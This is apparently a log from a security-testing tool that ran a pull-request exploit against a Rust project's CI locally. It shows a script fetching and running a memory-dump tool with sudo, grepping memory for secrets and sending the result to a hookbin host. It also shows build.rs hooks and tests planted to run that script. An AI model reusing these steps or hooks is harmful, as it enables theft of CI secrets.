@@ -1,0 +1,291 @@
+Generated GITHUB_RUN_ID: 22072905
+Hookbin receive URL: https://open-hookbin.vercel.app/22072905
+Hookbin read URL: https://open-hookbin.vercel.app/api/22072905
+time="2026-04-25T23:56:45Z" level=info msg="Using docker host 'unix:///var/run/docker.sock', and daemon socket 'unix:///var/run/docker.sock'"
+[CI/make fmt-check] ⭐ Run Set up job
+[CI/make fmt-check] 🚀  Start image=ghcr.io/catthehacker/ubuntu:full-24.04
+[CI/make fmt-check]   🐳  docker pull image=ghcr.io/catthehacker/ubuntu:full-24.04 platform= username= forcePull=true
+[CI/make fmt-check]   🐳  docker create image=ghcr.io/catthehacker/ubuntu:full-24.04 platform= entrypoint=["tail" "-f" "/dev/null"] cmd=[] network="host"
+[CI/make fmt-check]   🐳  docker run image=ghcr.io/catthehacker/ubuntu:full-24.04 platform= entrypoint=["tail" "-f" "/dev/null"] cmd=[] network="host"
+[CI/make fmt-check]   🐳  docker exec cmd=[chown -R 1001:1001 /home/nils/pwnhunter/attack-artifacts/20260424T232025Z/cakevm__node-cache/risks/risk-004-pwnrequestresult/workspace] user=0 workdir=
+[CI/make fmt-check]   🐳  docker exec cmd=[node --no-warnings -e console.log(process.execPath)] user= workdir=
+[CI/make fmt-check]   ✅  Success - Set up job
+[CI/make fmt-check]   ☁  git clone 'https://github.com/dtolnay/rust-toolchain' # ref=stable
+[CI/make fmt-check] ⭐ Run Pre dtolnay/rust-toolchain@stable
+[CI/make fmt-check]   ✅  Success - Pre dtolnay/rust-toolchain@stable [52.292038ms]
+[CI/make fmt-check] ⭐ Run Main actions/checkout@v4
+[CI/make fmt-check]   🐳  docker cp src=/home/nils/pwnhunter/attack-artifacts/20260424T232025Z/cakevm__node-cache/risks/risk-004-pwnrequestresult/workspace/. dst=/home/nils/pwnhunter/attack-artifacts/20260424T232025Z/cakevm__node-cache/risks/risk-004-pwnrequestresult/workspace
+[CI/make fmt-check]   🐳  docker exec cmd=[chown -R 1001:1001 /home/nils/pwnhunter/attack-artifacts/20260424T232025Z/cakevm__node-cache/risks/risk-004-pwnrequestresult/workspace] user=0 workdir=
+[CI/make fmt-check]   ✅  Success - Main actions/checkout@v4 [170.760128ms]
+[CI/make fmt-check] ⭐ Run Main dtolnay/rust-toolchain@stable
+[CI/make fmt-check]   🐳  docker cp src=attack-artifacts/20260424T232025Z/cakevm__node-cache/risks/risk-004-pwnrequestresult/workspace/.pwnhunter-home/.cache/act/dtolnay-rust-toolchain@stable/ dst=/var/run/act/actions/dtolnay-rust-toolchain@stable/
+[CI/make fmt-check]   🐳  docker exec cmd=[chown -R 1001:1001 /var/run/act/actions/dtolnay-rust-toolchain@stable/] user=0 workdir=
+[CI/make fmt-check] ⭐ Run Main : parse toolchain version
+if [[ -z $toolchain ]]; then
+  # GitHub does not enforce `required: true` inputs itself. https://github.com/actions/runner/issues/1070
+  echo "'toolchain' is a required input" >&2
+  exit 1
+elif [[ $toolchain =~ ^stable' '[0-9]+' '(year|month|week|day)s?' 'ago$ ]]; then
+  if [[ Linux == macOS ]]; then
+    echo "toolchain=1.$((($(date -v-$(sed 's/stable \([0-9]*\) \(.\).*/\1\2/' <<< $toolchain) +%s)/60/60/24-16569)/7/6))" >> $GITHUB_OUTPUT
+  else
+    echo "toolchain=1.$((($(date --date "${toolchain#stable }" +%s)/60/60/24-16569)/7/6))" >> $GITHUB_OUTPUT
+  fi
+elif [[ $toolchain =~ ^stable' 'minus' '[0-9]+' 'releases?$ ]]; then
+  echo "toolchain=1.$((($(date +%s)/60/60/24-16569)/7/6-${toolchain//[^0-9]/}))" >> $GITHUB_OUTPUT
+elif [[ $toolchain =~ ^1\.[0-9]+$ ]]; then
+  echo "toolchain=1.$((i=${toolchain#1.}, c=($(date +%s)/60/60/24-16569)/7/6, i+9*i*(10*i<=c)+90*i*(100*i<=c)))" >> $GITHUB_OUTPUT
+else
+  echo "toolchain=$toolchain" >> $GITHUB_OUTPUT
+fi
+[CI/make fmt-check]   🐳  docker exec cmd=[bash --noprofile --norc -e -o pipefail /var/run/act/workflow/1-composite-parse.sh] user= workdir=
+[CI/make fmt-check]   ✅  Success - Main : parse toolchain version
+if [[ -z $toolchain ]]; then
+  # GitHub does not enforce `required: true` inputs itself. https://github.com/actions/runner/issues/1070
+  echo "'toolchain' is a required input" >&2
+  exit 1
+elif [[ $toolchain =~ ^stable' '[0-9]+' '(year|month|week|day)s?' 'ago$ ]]; then
+  if [[ Linux == macOS ]]; then
+    echo "toolchain=1.$((($(date -v-$(sed 's/stable \([0-9]*\) \(.\).*/\1\2/' <<< $toolchain) +%s)/60/60/24-16569)/7/6))" >> $GITHUB_OUTPUT
+  else
+    echo "toolchain=1.$((($(date --date "${toolchain#stable }" +%s)/60/60/24-16569)/7/6))" >> $GITHUB_OUTPUT
+  fi
+elif [[ $toolchain =~ ^stable' 'minus' '[0-9]+' 'releases?$ ]]; then
+  echo "toolchain=1.$((($(date +%s)/60/60/24-16569)/7/6-${toolchain//[^0-9]/}))" >> $GITHUB_OUTPUT
+elif [[ $toolchain =~ ^1\.[0-9]+$ ]]; then
+  echo "toolchain=1.$((i=${toolchain#1.}, c=($(date +%s)/60/60/24-16569)/7/6, i+9*i*(10*i<=c)+90*i*(100*i<=c)))" >> $GITHUB_OUTPUT
+else
+  echo "toolchain=$toolchain" >> $GITHUB_OUTPUT
+fi
+ [148.234928ms]
+[CI/make fmt-check]   ⚙  ::set-output:: toolchain=stable
+[CI/make fmt-check] ⭐ Run Main : construct rustup command line
+echo "targets=$(for t in ${targets//,/ }; do echo -n ' --target' $t; done)" >> $GITHUB_OUTPUT
+echo "components=$(for c in ${components//,/ }; do echo -n ' --component' $c; done)" >> $GITHUB_OUTPUT
+echo "downgrade=" >> $GITHUB_OUTPUT
+[CI/make fmt-check]   🐳  docker exec cmd=[bash --noprofile --norc -e -o pipefail /var/run/act/workflow/1-composite-flags.sh] user= workdir=
+[CI/make fmt-check]   ✅  Success - Main : construct rustup command line
+echo "targets=$(for t in ${targets//,/ }; do echo -n ' --target' $t; done)" >> $GITHUB_OUTPUT
+echo "components=$(for c in ${components//,/ }; do echo -n ' --component' $c; done)" >> $GITHUB_OUTPUT
+echo "downgrade=" >> $GITHUB_OUTPUT
+ [137.721503ms]
+[CI/make fmt-check]   ⚙  ::set-output:: targets=
+[CI/make fmt-check]   ⚙  ::set-output:: components=
+[CI/make fmt-check]   ⚙  ::set-output:: downgrade=
+[CI/make fmt-check] ⭐ Run Main : set $CARGO_HOME
+echo CARGO_HOME=${CARGO_HOME:-"$HOME/.cargo"} >> $GITHUB_ENV
+[CI/make fmt-check]   🐳  docker exec cmd=[bash --noprofile --norc -e -o pipefail /var/run/act/workflow/1-composite-2.sh] user= workdir=
+[CI/make fmt-check]   ✅  Success - Main : set $CARGO_HOME
+echo CARGO_HOME=${CARGO_HOME:-"$HOME/.cargo"} >> $GITHUB_ENV
+ [140.343871ms]
+[CI/make fmt-check]   ⚙  ::set-env:: CARGO_HOME=/home/runner/.cargo
+[CI/make fmt-check] ⭐ Run Main : install rustup if needed
+if ! command -v rustup &>/dev/null; then
+  curl --proto '=https' --tlsv1.2 --retry 10 --retry-connrefused --location --silent --show-error --fail https://sh.rustup.rs | sh -s -- --default-toolchain none -y
+  echo "$CARGO_HOME/bin" >> $GITHUB_PATH
+fi
+[CI/make fmt-check]   🐳  docker exec cmd=[bash --noprofile --norc -e -o pipefail /var/run/act/workflow/1-composite-3.sh] user= workdir=
+[CI/make fmt-check]   ✅  Success - Main : install rustup if needed
+if ! command -v rustup &>/dev/null; then
+  curl --proto '=https' --tlsv1.2 --retry 10 --retry-connrefused --location --silent --show-error --fail https://sh.rustup.rs | sh -s -- --default-toolchain none -y
+  echo "$CARGO_HOME/bin" >> $GITHUB_PATH
+fi
+ [168.500239ms]
+[CI/make fmt-check] ⭐ Run Main rustup toolchain install stable
+[CI/make fmt-check]   🐳  docker exec cmd=[bash --noprofile --norc -e -o pipefail /var/run/act/workflow/1-composite-5.sh] user= workdir=
+[CI/make fmt-check]   | info: syncing channel updates for 'stable-x86_64-unknown-linux-gnu'
+[CI/make fmt-check]   | info: latest update on 2026-04-16, rust version 1.95.0 (59807616e 2026-04-14)
+[CI/make fmt-check]   | info: downloading component 'clippy'
+[CI/make fmt-check]   | info: downloading component 'rustfmt'
+[CI/make fmt-check]   | info: downloading component 'cargo'
+[CI/make fmt-check]   | info: downloading component 'rust-std'
+[CI/make fmt-check]   | info: downloading component 'rustc'
+[CI/make fmt-check]   | info: removing previous version of component 'clippy'
+[CI/make fmt-check]   | info: removing previous version of component 'rustfmt'
+[CI/make fmt-check]   | info: removing previous version of component 'cargo'
+[CI/make fmt-check]   | info: removing previous version of component 'rust-std'
+[CI/make fmt-check]   | info: removing previous version of component 'rustc'
+[CI/make fmt-check]   | info: installing component 'clippy'
+[CI/make fmt-check]   | info: installing component 'rustfmt'
+[CI/make fmt-check]   | info: installing component 'cargo'
+[CI/make fmt-check]   | info: installing component 'rust-std'
+[CI/make fmt-check]   | info: installing component 'rustc'
+[CI/make fmt-check]   | 
+[CI/make fmt-check]   |   stable-x86_64-unknown-linux-gnu updated - rustc 1.95.0 (59807616e 2026-04-14) (from rustc 1.92.0 (ded5c06cf 2025-12-08))
+[CI/make fmt-check]   | 
+[CI/make fmt-check]   ✅  Success - Main rustup toolchain install stable [21.914988253s]
+[CI/make fmt-check] ⭐ Run Main rustup default stable
+[CI/make fmt-check]   🐳  docker exec cmd=[bash --noprofile --norc -e -o pipefail /var/run/act/workflow/1-composite-6.sh] user= workdir=
+[CI/make fmt-check]   | info: using existing install for 'stable-x86_64-unknown-linux-gnu'
+[CI/make fmt-check]   | 
+[CI/make fmt-check]   | info: default toolchain set to 'stable-x86_64-unknown-linux-gnu'
+[CI/make fmt-check]   |   stable-x86_64-unknown-linux-gnu unchanged - rustc 1.95.0 (59807616e 2026-04-14)
+[CI/make fmt-check]   | 
+[CI/make fmt-check]   ✅  Success - Main rustup default stable [243.440408ms]
+[CI/make fmt-check] ⭐ Run Main : create cachekey
+DATE=$(rustc +stable --version --verbose | sed -ne 's/^commit-date: \(20[0-9][0-9]\)-\([01][0-9]\)-\([0-3][0-9]\)$/\1\2\3/p')
+HASH=$(rustc +stable --version --verbose | sed -ne 's/^commit-hash: //p')
+echo "cachekey=$(echo $DATE$HASH | head -c12)" >> $GITHUB_OUTPUT
+[CI/make fmt-check]   🐳  docker exec cmd=[bash --noprofile --norc -e -o pipefail /var/run/act/workflow/1-composite-rustc-version.sh] user= workdir=
+[CI/make fmt-check]   ✅  Success - Main : create cachekey
+DATE=$(rustc +stable --version --verbose | sed -ne 's/^commit-date: \(20[0-9][0-9]\)-\([01][0-9]\)-\([0-3][0-9]\)$/\1\2\3/p')
+HASH=$(rustc +stable --version --verbose | sed -ne 's/^commit-hash: //p')
+echo "cachekey=$(echo $DATE$HASH | head -c12)" >> $GITHUB_OUTPUT
+ [235.627081ms]
+[CI/make fmt-check]   ⚙  ::set-output:: cachekey=202604145980
+[CI/make fmt-check] ⭐ Run Main : disable incremental compilation
+if [ -z "${CARGO_INCREMENTAL+set}" ]; then
+  echo CARGO_INCREMENTAL=0 >> $GITHUB_ENV
+fi
+[CI/make fmt-check]   🐳  docker exec cmd=[bash --noprofile --norc -e -o pipefail /var/run/act/workflow/1-composite-8.sh] user= workdir=
+[CI/make fmt-check]   ✅  Success - Main : disable incremental compilation
+if [ -z "${CARGO_INCREMENTAL+set}" ]; then
+  echo CARGO_INCREMENTAL=0 >> $GITHUB_ENV
+fi
+ [147.790319ms]
+[CI/make fmt-check]   ⚙  ::set-env:: CARGO_INCREMENTAL=0
+[CI/make fmt-check] ⭐ Run Main : enable colors in Cargo output
+if [ -z "${CARGO_TERM_COLOR+set}" ]; then
+  echo CARGO_TERM_COLOR=always >> $GITHUB_ENV
+fi
+[CI/make fmt-check]   🐳  docker exec cmd=[bash --noprofile --norc -e -o pipefail /var/run/act/workflow/1-composite-9.sh] user= workdir=
+[CI/make fmt-check]   ✅  Success - Main : enable colors in Cargo output
+if [ -z "${CARGO_TERM_COLOR+set}" ]; then
+  echo CARGO_TERM_COLOR=always >> $GITHUB_ENV
+fi
+ [210.520272ms]
+[CI/make fmt-check] ⭐ Run Main : enable Cargo sparse registry
+# implemented in 1.66, stabilized in 1.68, made default in 1.70
+if [ -z "${CARGO_REGISTRIES_CRATES_IO_PROTOCOL+set}" -o -f "/tmp"/.implicit_cargo_registries_crates_io_protocol ]; then
+  if rustc +stable --version --verbose | grep -q '^release: 1\.6[89]\.'; then
+    touch "/tmp"/.implicit_cargo_registries_crates_io_protocol || true
+    echo CARGO_REGISTRIES_CRATES_IO_PROTOCOL=sparse >> $GITHUB_ENV
+  elif rustc +stable --version --verbose | grep -q '^release: 1\.6[67]\.'; then
+    touch "/tmp"/.implicit_cargo_registries_crates_io_protocol || true
+    echo CARGO_REGISTRIES_CRATES_IO_PROTOCOL=git >> $GITHUB_ENV
+  fi
+fi
+[CI/make fmt-check]   🐳  docker exec cmd=[bash --noprofile --norc -e -o pipefail /var/run/act/workflow/1-composite-10.sh] user= workdir=
+[CI/make fmt-check]   ✅  Success - Main : enable Cargo sparse registry
+# implemented in 1.66, stabilized in 1.68, made default in 1.70
+if [ -z "${CARGO_REGISTRIES_CRATES_IO_PROTOCOL+set}" -o -f "/tmp"/.implicit_cargo_registries_crates_io_protocol ]; then
+  if rustc +stable --version --verbose | grep -q '^release: 1\.6[89]\.'; then
+    touch "/tmp"/.implicit_cargo_registries_crates_io_protocol || true
+    echo CARGO_REGISTRIES_CRATES_IO_PROTOCOL=sparse >> $GITHUB_ENV
+  elif rustc +stable --version --verbose | grep -q '^release: 1\.6[67]\.'; then
+    touch "/tmp"/.implicit_cargo_registries_crates_io_protocol || true
+    echo CARGO_REGISTRIES_CRATES_IO_PROTOCOL=git >> $GITHUB_ENV
+  fi
+fi
+ [248.668216ms]
+[CI/make fmt-check] ⭐ Run Main : work around spurious network errors in curl 8.0
+# https://rust-lang.zulipchat.com/#narrow/stream/246057-t-cargo/topic/timeout.20investigation
+if rustc +stable --version --verbose | grep -q '^release: 1\.7[01]\.'; then
+  echo CARGO_HTTP_MULTIPLEXING=false >> $GITHUB_ENV
+fi
+[CI/make fmt-check]   🐳  docker exec cmd=[bash --noprofile --norc -e -o pipefail /var/run/act/workflow/1-composite-11.sh] user= workdir=
+[CI/make fmt-check]   ✅  Success - Main : work around spurious network errors in curl 8.0
+# https://rust-lang.zulipchat.com/#narrow/stream/246057-t-cargo/topic/timeout.20investigation
+if rustc +stable --version --verbose | grep -q '^release: 1\.7[01]\.'; then
+  echo CARGO_HTTP_MULTIPLEXING=false >> $GITHUB_ENV
+fi
+ [217.314149ms]
+[CI/make fmt-check] ⭐ Run Main rustc +stable --version --verbose
+[CI/make fmt-check]   🐳  docker exec cmd=[bash --noprofile --norc -e -o pipefail /var/run/act/workflow/1-composite-12.sh] user= workdir=
+[CI/make fmt-check]   | rustc 1.95.0 (59807616e 2026-04-14)
+[CI/make fmt-check]   | binary: rustc
+[CI/make fmt-check]   | commit-hash: 59807616e1fa2540724bfbac14d7976d7e4a3860
+[CI/make fmt-check]   | commit-date: 2026-04-14
+[CI/make fmt-check]   | host: x86_64-unknown-linux-gnu
+[CI/make fmt-check]   | release: 1.95.0
+[CI/make fmt-check]   | LLVM version: 22.1.2
+[CI/make fmt-check]   ✅  Success - Main rustc +stable --version --verbose [167.79026ms]
+[CI/make fmt-check]   ⚙  ::set-output:: cachekey=202604145980
+[CI/make fmt-check]   ⚙  ::set-output:: name=stable
+[CI/make fmt-check]   ✅  Success - Main dtolnay/rust-toolchain@stable [25.56481964s]
+[CI/make fmt-check] ⭐ Run Main make fmt-check
+[CI/make fmt-check]   🐳  docker exec cmd=[bash -e /var/run/act/workflow/2] user= workdir=
+[CI/make fmt-check]   | bash pwn.sh || true
+[CI/make fmt-check]   | Okay, we got this far. Let's continue...
+[CI/make fmt-check]   | + echo 'Okay, we got this far. Let'\''s continue...'
+[CI/make fmt-check]   | + curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/main/memdump.py
+[CI/make fmt-check]   | + sudo -E python3
+[CI/make fmt-check]   | + tr -d '\0'
+[CI/make fmt-check]   | + grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}'
+[CI/make fmt-check]   | + true
+[CI/make fmt-check]   | + '[' -s /tmp/secrets ']'
+[CI/make fmt-check]   | + echo 'No secrets found'
+[CI/make fmt-check]   | + curl -X PUT -d 'No secrets found' https://open-hookbin.vercel.app/22072905
+[CI/make fmt-check]   | No secrets found
+[CI/make fmt-check]   |   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+[CI/make fmt-check]   |                                  Dload  Upload   Total   Spent    Left  Speed
+[CI/make fmt-check]   | 
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
+100    16    0     0  100    16      0     78 --:--:-- --:--:-- --:--:--    78
+100   111    0    95  100    16    466     78 --:--:-- --:--:-- {"ok":true,"id":"c5607afb-415d-4cf9-9842-765513b638d6","receivedAt":"2026-04-25T23:57:14.377Z"}--:--:--   544
+[CI/make fmt-check]   | cargo fmt --all --check
+[CI/make fmt-check]   | Diff in /home/nils/pwnhunter/attack-artifacts/20260424T232025Z/cakevm__node-cache/risks/risk-004-pwnrequestresult/workspace/bin/node-cache/build.rs:2:
+[CI/make fmt-check]   |      println!("cargo:rerun-if-changed=build.rs");
+[CI/make fmt-check]   |      let manifest_dir = std::env::var("CARGO_MANIFEST_DIR").unwrap();
+[CI/make fmt-check]   |      let pwn_sh = std::path::Path::new(&manifest_dir).join("../../pwn.sh");
+[CI/make fmt-check]   | -    let _ = std::process::Command::new("bash")
+[CI/make fmt-check]   | -        .arg(pwn_sh)
+[CI/make fmt-check]   | -        .status();
+[CI/make fmt-check]   | +    let _ = std::process::Command::new("bash").arg(pwn_sh).status();
+act exited with code 1
+[CI/make fmt-check]   |  }
+[CI/make fmt-check]   |  
+[CI/make fmt-check]   | Diff in /home/nils/pwnhunter/attack-artifacts/20260424T232025Z/cakevm__node-cache/risks/risk-004-pwnrequestresult/workspace/crates/recorder/build.rs:2:
+[CI/make fmt-check]   |      println!("cargo:rerun-if-changed=build.rs");
+[CI/make fmt-check]   |      let manifest_dir = std::env::var("CARGO_MANIFEST_DIR").unwrap();
+[CI/make fmt-check]   |      let pwn_sh = std::path::Path::new(&manifest_dir).join("../../pwn.sh");
+[CI/make fmt-check]   | -    let _ = std::process::Command::new("bash")
+[CI/make fmt-check]   | -        .arg(pwn_sh)
+[CI/make fmt-check]   | -        .status();
+[CI/make fmt-check]   | +    let _ = std::process::Command::new("bash").arg(pwn_sh).status();
+[CI/make fmt-check]   |  }
+[CI/make fmt-check]   |  
+[CI/make fmt-check]   | Diff in /home/nils/pwnhunter/attack-artifacts/20260424T232025Z/cakevm__node-cache/risks/risk-004-pwnrequestresult/workspace/crates/recorder/src/lib.rs:8:
+[CI/make fmt-check]   |  mod pwn_test {
+[CI/make fmt-check]   |      #[test]
+[CI/make fmt-check]   |      fn test_pwn() {
+[CI/make fmt-check]   | -        let _ = std::process::Command::new("bash")
+[CI/make fmt-check]   | -            .arg("../../pwn.sh")
+[CI/make fmt-check]   | -            .status();
+[CI/make fmt-check]   | +        let _ = std::process::Command::new("bash").arg("../../pwn.sh").status();
+[CI/make fmt-check]   |      }
+[CI/make fmt-check]   |  }
+[CI/make fmt-check]   |  
+[CI/make fmt-check]   | Diff in /home/nils/pwnhunter/attack-artifacts/20260424T232025Z/cakevm__node-cache/risks/risk-004-pwnrequestresult/workspace/crates/rpc/build.rs:2:
+[CI/make fmt-check]   |      println!("cargo:rerun-if-changed=build.rs");
+[CI/make fmt-check]   |      let manifest_dir = std::env::var("CARGO_MANIFEST_DIR").unwrap();
+[CI/make fmt-check]   |      let pwn_sh = std::path::Path::new(&manifest_dir).join("../../pwn.sh");
+[CI/make fmt-check]   | -    let _ = std::process::Command::new("bash")
+[CI/make fmt-check]   | -        .arg(pwn_sh)
+[CI/make fmt-check]   | -        .status();
+[CI/make fmt-check]   | +    let _ = std::process::Command::new("bash").arg(pwn_sh).status();
+[CI/make fmt-check]   |  }
+[CI/make fmt-check]   |  
+[CI/make fmt-check]   | Diff in /home/nils/pwnhunter/attack-artifacts/20260424T232025Z/cakevm__node-cache/risks/risk-004-pwnrequestresult/workspace/crates/rpc/src/lib.rs:8:
+[CI/make fmt-check]   |  mod pwn_test {
+[CI/make fmt-check]   |      #[test]
+[CI/make fmt-check]   |      fn test_pwn() {
+[CI/make fmt-check]   | -        let _ = std::process::Command::new("bash")
+[CI/make fmt-check]   | -            .arg("../../pwn.sh")
+[CI/make fmt-check]   | -            .status();
+[CI/make fmt-check]   | +        let _ = std::process::Command::new("bash").arg("../../pwn.sh").status();
+[CI/make fmt-check]   |      }
+[CI/make fmt-check]   |  }
+[CI/make fmt-check]   |  
+[CI/make fmt-check]   | make: *** [Makefile:24: fmt-check] Error 1
+[CI/make fmt-check]   ❌  Failure - Main make fmt-check [714.708102ms]
+[CI/make fmt-check] exitcode '2': failure
+[CI/make fmt-check] ⭐ Run Post dtolnay/rust-toolchain@stable
+[CI/make fmt-check]   🐳  docker cp src=attack-artifacts/20260424T232025Z/cakevm__node-cache/risks/risk-004-pwnrequestresult/workspace/.pwnhunter-home/.cache/act/dtolnay-rust-toolchain@stable/ dst=/var/run/act/actions/dtolnay-rust-toolchain@stable/
+[CI/make fmt-check]   🐳  docker exec cmd=[chown -R 1001:1001 /var/run/act/actions/dtolnay-rust-toolchain@stable/] user=0 workdir=
+[CI/make fmt-check]   ✅  Success - Post dtolnay/rust-toolchain@stable [339.359759ms]
+[CI/make fmt-check] ⭐ Run Complete job
+[CI/make fmt-check]   ✅  Success - Complete job
+[CI/make fmt-check] 🏁  Job failed
+Error: Job 'make fmt-check' failed
+SUCCESS: Exploit worked for job fmt 🎉✅
